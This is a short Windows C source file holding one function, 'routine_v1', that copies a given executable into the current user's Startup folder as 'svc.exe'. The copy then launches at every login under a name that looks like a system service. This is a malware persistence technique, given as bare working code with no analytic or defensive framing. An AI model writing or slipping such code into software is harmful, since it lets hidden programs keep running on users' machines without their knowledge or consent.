#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v1(const char* source){
    char path[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
    lstrcatA(path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe");
    CopyFileA(source, path, FALSE);
}